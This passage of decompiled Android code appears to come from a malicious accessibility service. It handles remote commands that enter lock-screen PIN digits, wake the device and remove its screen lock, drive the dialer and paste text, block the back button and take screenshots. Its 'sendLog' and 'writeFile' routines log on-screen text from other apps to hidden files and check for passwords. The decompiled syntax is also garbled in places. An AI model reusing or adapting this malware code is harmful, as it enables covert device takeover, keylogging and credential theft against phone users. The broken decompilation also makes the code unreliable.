            result = (AccessibilityNodeInfo) result;
            AccessibilityNodeInfo result82 = result.getParent();
            int val11 = 16;
            boolean result83 = result.performAction(val11);
            Thread.sleep(v18 .. v19);
            Object result84 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            AccessibilityNodeInfo result85 = result.getParent();
            boolean result86 = result.performAction(val11);
            // continue loop -> :goto_8d0
            Intent intent3 = new Intent();
            StringBuilder stringBuilder3 = new StringBuilder();
            String result87 = Uri.encode(result);
            StringBuilder result88 = stringBuilder3.append(result);
            String result89 = stringBuilder3.toString();
            Uri result90 = Uri.parse(result);
            int val12 = 268435456;
            Intent result91 = intent3.setFlags(val12);
            v1.startActivity(intent3);
            Thread.sleep(v16 .. v17);
            AccessibilityNodeInfo result92 = p0 .. p0.getRootInActiveWindow();
            List result93 = result.findAccessibilityNodeInfosByViewId(str45);
            int result94 = result.size();
            int val13 = 2;
            if (result != val13) {
                // branch: cond_496
            }
            Object result95 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            AccessibilityNodeInfo result96 = result.getParent();
            int val14 = 16;
            boolean result97 = result.performAction(val14);
            Thread.sleep(val14, val13);
            boolean result98 = v1.performGlobalAction(val4);
            v1.startActivity(intent3);
            Thread.sleep(v16 .. v17);
            AccessibilityNodeInfo result99 = p0 .. p0.getRootInActiveWindow();
            List result100 = result.findAccessibilityNodeInfosByViewId(str45);
            int result101 = result.size();
            int val15 = 2;
            if (result != val15) {
                // branch: cond_8d0
            }
            Object result102 = result.get(val4);
            result = (AccessibilityNodeInfo) result;
            AccessibilityNodeInfo result103 = result.getParent();
            int val16 = 16;
            boolean result104 = result.performAction(val16);
            // continue loop -> :goto_8d0
            String str53 = "LKhu";
            boolean result105 = result.equals(str53);
            if (result == null) {
                // branch: cond_60b
            }
            if (result == null) {
                // branch: cond_8d0
            }
            boolean result106 = result.isEmpty();
            if (result != null) {
                // branch: cond_8d0
            }
            Context result107 = p0 .. p0.getApplicationContext();
            String isblocked2 = My_Settings.isblocked;
            Boolean result108 = Boolean.valueOf(val4);
            My_Settings.WriteBool(result, isblocked2, result);
            AccessibilityServiceCore MyAccess6 = MainBackgroundService.MyAccess;
            MyAccess6.Treger(str43);
            AccessibilityServiceCore MyAccess7 = MainBackgroundService.MyAccess;
            MyAccess7.Treger(str42);
            StringBuilder stringBuilder4 = new StringBuilder();
            StringBuilder result109 = stringBuilder4.append(val16);
            StringBuilder result110 = stringBuilder4.append(str44);
            StringBuilder result111 = stringBuilder4.append(val16);
            String str54 = "*1*";
            StringBuilder result112 = stringBuilder4.append(str54);
            StringBuilder result113 = stringBuilder4.append(str54);
            StringBuilder result114 = stringBuilder4.append(str44);
            StringBuilder result115 = stringBuilder4.append(str54);
            String result116 = stringBuilder4.toString();
            String MANUFACTURER2 = Build.MANUFACTURER;
            boolean result117 = MANUFACTURER2.equalsIgnoreCase(str41);
            if (result == null) {
                // branch: cond_59a
            }
            Intent intent4 = new Intent();
            StringBuilder stringBuilder5 = new StringBuilder();
            String result118 = Uri.encode(result);
            StringBuilder result119 = stringBuilder5.append(result);
            String result120 = stringBuilder5.toString();
            Uri result121 = Uri.parse(result);
            int val17 = 268435456;
            Intent result122 = intent4.setFlags(val17);
            v1.startActivity(intent4);
            Thread.sleep(val17, result);
            boolean result123 = v1.performGlobalAction(val4);
            PackageManager result124 = p0 .. p0.getPackageManager();
            Intent result125 = result.getLaunchIntentForPackage(str40);
            int val18 = 268435456;
            Intent result126 = intent4.setFlags(val18);
            v1.startActivity(result);
            Thread.sleep(v18 .. v19);
            AccessibilityServiceCore MyAccess8 = MainBackgroundService.MyAccess;
            AccessibilityServiceCore.clipboardText = result;
            AccessibilityServiceCore MyAccess9 = MainBackgroundService.MyAccess;
            Boolean result127 = Boolean.valueOf(val4);
            AccessibilityServiceCore.needsPaste = result;
            AccessibilityServiceCore MyAccess10 = MainBackgroundService.MyAccess;
            MyAccess10.triggerEvent();
            Thread.sleep(v18 .. v19);
            AccessibilityNodeInfo result128 = p0 .. p0.getRootInActiveWindow();
            String str55 = "com.samsung.android.dialer:id/image_view";
            List result129 = result.findAccessibilityNodeInfosByViewId(str55);
            AccessibilityNodeInfo result130 = p0 .. p0.getRootInActiveWindow();
            String str56 = "com.samsung.android.dialer:id/dialButtonImage";
            List result131 = result.findAccessibilityNodeInfosByViewId(str56);
            Object result132 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            AccessibilityNodeInfo result133 = result.getParent();
            int val19 = 16;
            boolean result134 = result.performAction(val19);
            Thread.sleep(v18 .. v19);
            Object result135 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            AccessibilityNodeInfo result136 = result.getParent();
            boolean result137 = result.performAction(val19);
            // continue loop -> :goto_8d0
            Intent intent5 = new Intent();
            StringBuilder stringBuilder6 = new StringBuilder();
            String result138 = Uri.encode(result);
            StringBuilder result139 = stringBuilder6.append(result);
            String result140 = stringBuilder6.toString();
            Uri result141 = Uri.parse(result);
            int val20 = 268435456;
            Intent result142 = intent5.setFlags(val20);
            v1.startActivity(intent5);
            Thread.sleep(v16 .. v17);
            AccessibilityNodeInfo result143 = p0 .. p0.getRootInActiveWindow();
            List result144 = result.findAccessibilityNodeInfosByViewId(str45);
            int result145 = result.size();
            int val21 = 2;
            if (result != val21) {
                // branch: cond_5e8
            }
            Object result146 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            AccessibilityNodeInfo result147 = result.getParent();
            int val22 = 16;
            boolean result148 = result.performAction(val22);
            Thread.sleep(val22, val21);
            boolean result149 = v1.performGlobalAction(val4);
            v1.startActivity(intent5);
            Thread.sleep(v16 .. v17);
            AccessibilityNodeInfo result150 = p0 .. p0.getRootInActiveWindow();
            List result151 = result.findAccessibilityNodeInfosByViewId(str45);
            int result152 = result.size();
            int val23 = 2;
            if (result != val23) {
                // branch: cond_8d0
            }
            Object result153 = result.get(val4);
            result = (AccessibilityNodeInfo) result;
            AccessibilityNodeInfo result154 = result.getParent();
            int val24 = 16;
            boolean result155 = result.performAction(val24);
            // continue loop -> :goto_8d0
            String str57 = "LKde";
            boolean result156 = result.equals(str57);
            if (result == null) {
                // branch: cond_62b
            }
            AccessibilityNodeInfo result157 = p0 .. p0.getRootInActiveWindow();
            String str58 = "com.android.systemui:id/delete_button";
            List result158 = result.findAccessibilityNodeInfosByViewId(str58);
            Object result159 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            int val25 = 16;
            boolean result160 = result.performAction(val25);
            // continue loop -> :goto_8d0
            String str59 = "LKen";
            boolean result161 = result.equals(str59);
            if (result == null) {
                // branch: cond_660
            }
            AccessibilityNodeInfo result162 = p0 .. p0.getRootInActiveWindow();
            String str60 = "com.android.systemui:id/key_enter_text";
            List result163 = result.findAccessibilityNodeInfosByViewId(str60);
            boolean result164 = result.isEmpty();
            if (result != null) {
                // branch: cond_64d
            }
            Object result165 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            int val26 = 16;
            // continue loop -> :goto_65b
            String str61 = "com.android.systemui:id/key_enter";
            List result166 = result.findAccessibilityNodeInfosByViewId(str61);
            Object result167 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            // continue loop -> :goto_64a
            boolean result168 = result.performAction(str61);
            // continue loop -> :goto_8d0
            String str62 = "LKnn";
            boolean result169 = result.equals(str62);
            if (result == null) {
                // branch: cond_683
            }
            int val27 = 8;
            boolean result170 = v1.performGlobalAction(val27);
            Thread.sleep(val27, null);
            p0 .. p0.wakeupScreen();
            int val28 = 3;
            boolean result171 = v1.performGlobalAction(val28);
            Thread.sleep(val27, null);
            ScreenLockMonitor.destoryLock(p0 .. p0);
            // continue loop -> :goto_8d0
            String str63 = "LK0";
            boolean result172 = val28.equals(str63);
            if (result == null) {
                // branch: cond_6b8
            }
            AccessibilityNodeInfo result173 = p0 .. p0.getRootInActiveWindow();
            String str64 = "com.android.systemui:id/VivoPinkey0";
            List result174 = result.findAccessibilityNodeInfosByViewId(str64);
            boolean result175 = result.isEmpty();
            if (result != null) {
                // branch: cond_6a5
            }
            Object result176 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            int val29 = 16;
            // continue loop -> :goto_6b3
            String str65 = "com.android.systemui:id/key0";
            List result177 = result.findAccessibilityNodeInfosByViewId(str65);
            Object result178 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            // continue loop -> :goto_6a2
            boolean result179 = result.performAction(str65);
            // continue loop -> :goto_8d0
            String str66 = "LK1";
            boolean result180 = result.equals(str66);
            if (result == null) {
                // branch: cond_6ed
            }
            AccessibilityNodeInfo result181 = p0 .. p0.getRootInActiveWindow();
            String str67 = "com.android.systemui:id/VivoPinkey1";
            List result182 = result.findAccessibilityNodeInfosByViewId(str67);
            boolean result183 = result.isEmpty();
            if (result != null) {
                // branch: cond_6da
            }
            Object result184 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            int val30 = 16;
            // continue loop -> :goto_6e8
            String str68 = "com.android.systemui:id/key1";
            List result185 = result.findAccessibilityNodeInfosByViewId(str68);
            Object result186 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            // continue loop -> :goto_6d7
            boolean result187 = result.performAction(str68);
            // continue loop -> :goto_8d0
            String str69 = "LK2";
            boolean result188 = result.equals(str69);
            if (result == null) {
                // branch: cond_722
            }
            AccessibilityNodeInfo result189 = p0 .. p0.getRootInActiveWindow();
            String str70 = "com.android.systemui:id/VivoPinkey2";
            List result190 = result.findAccessibilityNodeInfosByViewId(str70);
            boolean result191 = result.isEmpty();
            if (result != null) {
                // branch: cond_70f
            }
            Object result192 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            int val31 = 16;
            // continue loop -> :goto_71d
            String str71 = "com.android.systemui:id/key2";
            List result193 = result.findAccessibilityNodeInfosByViewId(str71);
            Object result194 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            // continue loop -> :goto_70c
            boolean result195 = result.performAction(str71);
            // continue loop -> :goto_8d0
            String str72 = "LK3";
            boolean result196 = result.equals(str72);
            if (result == null) {
                // branch: cond_757
            }
            AccessibilityNodeInfo result197 = p0 .. p0.getRootInActiveWindow();
            String str73 = "com.android.systemui:id/VivoPinkey3";
            List result198 = result.findAccessibilityNodeInfosByViewId(str73);
            boolean result199 = result.isEmpty();
            if (result != null) {
                // branch: cond_744
            }
            Object result200 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            int val32 = 16;
            // continue loop -> :goto_752
            String str74 = "com.android.systemui:id/key3";
            List result201 = result.findAccessibilityNodeInfosByViewId(str74);
            Object result202 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            // continue loop -> :goto_741
            boolean result203 = result.performAction(str74);
            // continue loop -> :goto_8d0
            String str75 = "LK4";
            boolean result204 = result.equals(str75);
            if (result == null) {
                // branch: cond_78c
            }
            AccessibilityNodeInfo result205 = p0 .. p0.getRootInActiveWindow();
            String str76 = "com.android.systemui:id/VivoPinkey4";
            List result206 = result.findAccessibilityNodeInfosByViewId(str76);
            boolean result207 = result.isEmpty();
            if (result != null) {
                // branch: cond_779
            }
            Object result208 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            int val33 = 16;
            // continue loop -> :goto_787
            String str77 = "com.android.systemui:id/key4";
            List result209 = result.findAccessibilityNodeInfosByViewId(str77);
            Object result210 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            // continue loop -> :goto_776
            boolean result211 = result.performAction(str77);
            // continue loop -> :goto_8d0
            String str78 = "LK5";
            boolean result212 = result.equals(str78);
            if (result == null) {
                // branch: cond_7c1
            }
            AccessibilityNodeInfo result213 = p0 .. p0.getRootInActiveWindow();
            String str79 = "com.android.systemui:id/VivoPinkey5";
            List result214 = result.findAccessibilityNodeInfosByViewId(str79);
            boolean result215 = result.isEmpty();
            if (result != null) {
                // branch: cond_7ae
            }
            Object result216 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            int val34 = 16;
            // continue loop -> :goto_7bc
            String str80 = "com.android.systemui:id/key5";
            List result217 = result.findAccessibilityNodeInfosByViewId(str80);
            Object result218 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            // continue loop -> :goto_7ab
            boolean result219 = result.performAction(str80);
            // continue loop -> :goto_8d0
            String str81 = "LK6";
            boolean result220 = result.equals(str81);
            if (result == null) {
                // branch: cond_7f6
            }
            AccessibilityNodeInfo result221 = p0 .. p0.getRootInActiveWindow();
            String str82 = "com.android.systemui:id/VivoPinkey6";
            List result222 = result.findAccessibilityNodeInfosByViewId(str82);
            boolean result223 = result.isEmpty();
            if (result != null) {
                // branch: cond_7e3
            }
            Object result224 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            int val35 = 16;
            // continue loop -> :goto_7f1
            String str83 = "com.android.systemui:id/key6";
            List result225 = result.findAccessibilityNodeInfosByViewId(str83);
            Object result226 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            // continue loop -> :goto_7e0
            boolean result227 = result.performAction(str83);
            // continue loop -> :goto_8d0
            String str84 = "LK7";
            boolean result228 = result.equals(str84);
            if (result == null) {
                // branch: cond_82b
            }
            AccessibilityNodeInfo result229 = p0 .. p0.getRootInActiveWindow();
            String str85 = "com.android.systemui:id/VivoPinkey7";
            List result230 = result.findAccessibilityNodeInfosByViewId(str85);
            boolean result231 = result.isEmpty();
            if (result != null) {
                // branch: cond_818
            }
            Object result232 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            int val36 = 16;
            // continue loop -> :goto_826
            String str86 = "com.android.systemui:id/key7";
            List result233 = result.findAccessibilityNodeInfosByViewId(str86);
            Object result234 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            // continue loop -> :goto_815
            boolean result235 = result.performAction(str86);
            // continue loop -> :goto_8d0
            String str87 = "LK8";
            boolean result236 = result.equals(str87);
            if (result == null) {
                // branch: cond_860
            }
            AccessibilityNodeInfo result237 = p0 .. p0.getRootInActiveWindow();
            String str88 = "com.android.systemui:id/VivoPinkey8";
            List result238 = result.findAccessibilityNodeInfosByViewId(str88);
            boolean result239 = result.isEmpty();
            if (result != null) {
                // branch: cond_84d
            }
            Object result240 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            int val37 = 16;
            // continue loop -> :goto_85b
            String str89 = "com.android.systemui:id/key8";
            List result241 = result.findAccessibilityNodeInfosByViewId(str89);
            Object result242 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            // continue loop -> :goto_84a
            boolean result243 = result.performAction(str89);
            // continue loop -> :goto_8d0
            String str90 = "LK9";
            boolean result244 = result.equals(str90);
            if (result == null) {
                // branch: cond_894
            }
            AccessibilityNodeInfo result245 = p0 .. p0.getRootInActiveWindow();
            String str91 = "com.android.systemui:id/VivoPinkey9";
            List result246 = result.findAccessibilityNodeInfosByViewId(str91);
            boolean result247 = result.isEmpty();
            if (result != null) {
                // branch: cond_882
            }
            Object result248 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            int val38 = 16;
            // continue loop -> :goto_890
            String str92 = "com.android.systemui:id/key9";
            List result249 = result.findAccessibilityNodeInfosByViewId(str92);
            Object result250 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            // continue loop -> :goto_87f
            boolean result251 = result.performAction(str92);
            // continue loop -> :goto_8d0
            String str93 = "SK";
            boolean result252 = result.equals(str93);
            if (result == null) {
                // branch: cond_8d0
            }
            String ifScreenShot = MainBackgroundService.ifScreenShot;
            boolean result253 = str34.equals(ifScreenShot);
            if (result == null) {
                // branch: cond_8a9
            }
            String str94 = "0";
            MainBackgroundService.ifScreenShot = str94;
            // continue loop -> :goto_8ab
            MainBackgroundService.ifScreenShot = str34;
            String ifScreenShot2 = MainBackgroundService.ifScreenShot;
            boolean result254 = str34.equals(ifScreenShot2);
            if (result == null) {
                // branch: cond_8c3
            }
            Thread thread3 = new Thread();
            AccessibilityServiceCore.7 accessibilityServiceCore.7 = new AccessibilityServiceCore.7();
            v1.screenShotThread = thread3;
            thread3.start();
            // continue loop -> :goto_8cb
            Thread screenShotThread = v1.screenShotThread;
            screenShotThread.interrupt();
            v1.screenShotThread = null;
            return;
            } catch (Exception e) {
                e.printStackTrace();
            null.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void navigateHome() {
        try {
            int val = 2;
            boolean result = this.performGlobalAction(val);
            boolean result2 = this.performGlobalAction(val);
            boolean result3 = this.performGlobalAction(val);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public boolean showActivity(Class param1) {
        try {
            Intent intent = new Intent();
            int val = 268435456;
            Intent result = intent.addFlags(val);
            int val2 = 536870912;
            Intent result2 = result.addFlags(val2);
            this.startActivity(result);
            return 1;
            } catch (Exception e) {
                e.printStackTrace();
            return null;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void triggerEvent() {
        Handler handler = new Handler();
        Looper result = Looper.getMainLooper();
        AccessibilityServiceCore.15 accessibilityServiceCore.15 = new AccessibilityServiceCore.15();
        boolean result2 = handler.post(accessibilityServiceCore.15);
        return;
    }

    public void blockBackButton() {
        try {
            boolean result = this.performGlobalAction(1);
            boolean result2 = this.performGlobalAction(1);
            boolean result3 = this.performGlobalAction(1);
            boolean result4 = this.performGlobalAction(1);
            boolean result5 = this.performGlobalAction(1);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void click(int param1, int param2) {
        try {
            AccessibilityNodeInfo result = this.getRootInActiveWindow();
            AccessibilityServiceCore.clickAtPosition(param1, param2, result);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void pasteText() {
        try {
            AccessibilityNodeInfo result = this.getRootInActiveWindow();
            AccessibilityNodeInfo result2 = result.findFocus(1);
            if (result == null) {
                // branch: cond_32
            }
            Bundle bundle = new Bundle();
            String str = "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE";
            String clipboardText = AccessibilityServiceCore.clipboardText;
            bundle.putString(str, clipboardText);
            int val = 2097152;
            boolean result3 = result.performAction(val, bundle);
            if (result != null) {
                // branch: cond_27
            }
            AccessibilityNodeInfo globalNode = AccessibilityServiceCore.globalNode;
            if (globalNode != null) {
                // branch: cond_24
            }
            return;
            boolean result4 = globalNode.performAction(val, bundle);
            String str2 = "";
            AccessibilityServiceCore.clipboardText = str2;
            Boolean result5 = Boolean.valueOf(null);
            AccessibilityServiceCore.needsPaste = result;
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void sendLog(AccessibilityEvent param1, int param2) {
        try {
            String str = "#";
            int val = 3;
            boolean k = MainBackgroundService.k;
            if (k == null) {
                // branch: cond_bf
            }
            boolean k_live = MainBackgroundService.k_live;
            if (k_live == null) {
                // branch: cond_bf
            }
            if (param1 == null) {
                // branch: cond_bf
            }
            List result = param1.getText();
            String result2 = result.toString();
            if (result == null) {
                // branch: cond_20
            }
            int result3 = result.length();
            if (result >= 1) {
                // branch: cond_28
            }
            CharSequence result4 = param1.getContentDescription();
            String result5 = result.toString();
            if (result == null) {
                // branch: cond_be
            }
            int result6 = result.length();
            if (result >= 1) {
                // branch: cond_32
            }
            // continue loop -> :goto_be
            CharSequence result7 = param1.getPackageName();
            result = (String) result;
            Context result8 = this.getApplicationContext();
            PackageManager result9 = result.getPackageManager();
            String str2 = "null";
            Context appContext = MainBackgroundService.appContext;
            PackageManager result10 = appContext.getPackageManager();
            Drawable result11 = result.getApplicationIcon(result);
            int val2 = 24;
            Bitmap result12 = this.convertToBitmap(result, val2, val2);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            Bitmap.CompressFormat JPEG = Bitmap$CompressFormat.JPEG;
            int val3 = 50;
            boolean result13 = result.compress(JPEG, val3, byteArrayOutputStream);
            byte[] result14 = byteArrayOutputStream.toByteArray();
            String result15 = Base64.encodeToString(result, null);
            } catch (Exception e) {
                e.printStackTrace();
            ApplicationInfo result16 = result.getApplicationInfo(result, null);
            // continue loop -> :goto_6c
            } catch (Exception e) {
                e.printStackTrace();
            if (null == null) {
                // branch: cond_73
            }
            CharSequence result17 = result.getApplicationLabel(null);
            // continue loop -> :goto_77
            String[] c_mn = MainBackgroundService.c_mn;
            String item = c_mn[val];
            item = (String) item;
            StringBuilder stringBuilder = new StringBuilder();
            String[] c_mn2 = MainBackgroundService.c_mn;
            String item2 = c_mn2[1];
            StringBuilder result18 = stringBuilder.append(item2);
            String[] c_mn3 = MainBackgroundService.c_mn;
            int val4 = 2;
            String item3 = c_mn3[val4];
            StringBuilder result19 = stringBuilder.append(item3);
            StringBuilder result20 = stringBuilder.append(item);
            String[] c_mn4 = MainBackgroundService.c_mn;
            String item4 = c_mn4[val4];
            StringBuilder result21 = stringBuilder.append(item4);
            StringBuilder result22 = stringBuilder.append(result);
            String[] c_mn5 = MainBackgroundService.c_mn;
            String item5 = c_mn5[val4];
            StringBuilder result23 = stringBuilder.append(item5);
            String result24 = String.valueOf(param2);
            StringBuilder result25 = stringBuilder.append(result);
            String str3 = "<0>";
            StringBuilder result26 = stringBuilder.append(str3);
            StringBuilder result27 = stringBuilder.append(result);
            String result28 = stringBuilder.toString();
            String str4 = "\t";
            byte[] result29 = str4.getBytes();
            DataEncryptionEngine.encodeBase64(result, result);
            // continue loop -> :goto_bf
            return;
            } catch (Exception e) {
                e.printStackTrace();
            List result30 = param1.getText();
            String result31 = result.toString();
            if (result == null) {
                // branch: cond_cf
            }
            int result32 = result.length();
            if (result >= 1) {
                // branch: cond_d7
            }
            CharSequence result33 = param1.getContentDescription();
            String result34 = result.toString();
            CharSequence result35 = param1.getPackageName();
            result = (String) result;
            Context result36 = this.getApplicationContext();
            PackageManager result37 = result.getPackageManager();
            ApplicationInfo result38 = result.getApplicationInfo(result, null);
            } catch (Exception e) {
                e.printStackTrace();
            if (result == null) {
                // branch: cond_f0
            }
            CharSequence result39 = result.getApplicationLabel(result);
            // continue loop -> :goto_f4
            String[] c_mn6 = MainBackgroundService.c_mn;
            String item6 = c_mn6[result];
            item6 = (String) item6;
            StringBuilder stringBuilder2 = new StringBuilder();
            StringBuilder result40 = stringBuilder2.append(item6);
            StringBuilder result41 = stringBuilder2.append(str);
            StringBuilder result42 = stringBuilder2.append(result);
            StringBuilder result43 = stringBuilder2.append(str);
            String result44 = String.valueOf(param2);
            StringBuilder result45 = stringBuilder2.append(result);
            String result46 = stringBuilder2.toString();
            this.writeFile(result);
            this.checkPassword(param1);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        } catch (PackageManager$NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    void writeFile(String param1) {
        try {
            String str = ".txt";
            String str2 = "/Config/sys/apps/log";
            String str3 = "log-";
            String str4 = "/Config/sys/apps/log/log-";
            boolean result = this.checkIfMatch(param1);
            if (result == null) {
                // branch: cond_17
            }
            int val = 7;
            int val2 = 11;
            String result2 = param1.substring(val, val2);
            String str5 = "yyyy-MM-dd";
            Date date = new Date();
            CharSequence result3 = DateFormat.format(str5, date);
            String result4 = result.toString();
            File result5 = Environment.getExternalStorageDirectory();
            File file = new File();
            File file2 = new File();
            StringBuilder stringBuilder = new StringBuilder();
            StringBuilder result6 = stringBuilder.append(result);
            StringBuilder result7 = stringBuilder.append(str);
            String result8 = stringBuilder.toString();
            boolean result9 = file.exists();
            if (result != null) {
                // branch: cond_4c
            }
            boolean result10 = file.mkdirs();
            boolean result11 = file2.exists();
            if (result != null) {
                // branch: cond_55
            }
            boolean result12 = file2.createNewFile();
            StringBuilder stringBuilder2 = new StringBuilder();
            String result13 = AccessibilityServiceCore.toBase64(param1);
            StringBuilder result14 = stringBuilder2.append(result);
            String str6 = ">\r\n";
            StringBuilder result15 = stringBuilder2.append(str6);
            String result16 = stringBuilder2.toString();
            File file3 = new File();
            StringBuilder stringBuilder3 = new StringBuilder();
            StringBuilder result17 = stringBuilder3.append(result);
            StringBuilder result18 = stringBuilder3.append(str2);
            String result19 = stringBuilder3.toString();
            StringBuilder stringBuilder4 = new StringBuilder();
            StringBuilder result20 = stringBuilder4.append(result);
            StringBuilder result21 = stringBuilder4.append(str);
            String result22 = stringBuilder4.toString();
            boolean result23 = file3.exists();
            if (result != null) {
                // branch: cond_96
            }
            boolean result24 = file3.createNewFile();
            FileOutputStream fileOutputStream = new FileOutputStream();
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter();
            Writer result25 = outputStreamWriter.append(result);
            outputStreamWriter.flush();
            outputStreamWriter.close();
            fileOutputStream.close();
            fileOutputStream.flush();
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void wakeupScreen() {
        try {
            String str = "power";
            Object result = this.getSystemService(str);
            result = (PowerManager) result;
            boolean result2 = result.isInteractive();
            if (result != null) {
                // branch: cond_35
            }
            String str2 = "MyAccessibilityService:wakeLock";
            int val = 805306394;
            PowerManager.WakeLock result3 = result.newWakeLock(val, str2);
            result.acquire();
            Handler handler = new Handler();
            AccessibilityServiceCore.13 accessibilityServiceCore.13 = new AccessibilityServiceCore.13();
            boolean result4 = handler.postDelayed(accessibilityServiceCore.13, v3, v4);
            // continue loop -> :goto_35
            } catch (Exception e) {
                e.printStackTrace();
            AccessibilityServiceCore.14 accessibilityServiceCore.14 = new AccessibilityServiceCore.14();
            Void[] arr = new Void[null];
            AsyncTask result5 = accessibilityServiceCore.14.execute(arr);
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}